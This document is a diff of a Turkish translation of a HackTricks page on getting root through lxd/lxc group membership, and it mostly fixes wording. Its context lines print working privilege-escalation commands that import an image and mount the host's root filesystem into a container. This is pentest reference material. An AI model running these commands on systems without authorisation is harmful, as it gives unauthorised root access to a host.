@@ -2,7 +2,7 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Eğer _**lxd**_ **veya** _**lxc**_ **grubuna** ait iseniz, root olabilirsiniz.
+_Eğer_ **lxd** _veya_ **lxc** _grubuna ait iseniz, root olabilirsiniz._
 
 ## İnternetsiz Sömürü
 
@@ -33,7 +33,7 @@ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ## Using build-lxc
 sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
-Dosyaları **lxd.tar.xz** ve **rootfs.squashfs** yükleyin, görüntüyü depoya ekleyin ve bir konteyner oluşturun:
+Dosyaları **lxd.tar.xz** ve **rootfs.squashfs** yükleyin, resmi depoya ekleyin ve bir konteyner oluşturun:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -49,8 +49,8 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Eğer bu hatayı _**Hata: Depo havuzu bulunamadı. Lütfen yeni bir depo havuzu oluşturun**_\
-> **`lxd init`** komutunu çalıştırın ve önceki komut grubunu **tekrarlayın**
+> Eğer bu hatayı _**Hata: Depolama havuzu bulunamadı. Lütfen yeni bir depolama havuzu oluşturun**_\
+> **`lxd init`** komutunu çalıştırın ve önceki komut grubunu **tekrar** edin
 
 Sonunda konteyneri çalıştırabilir ve root alabilirsiniz:
 ```bash
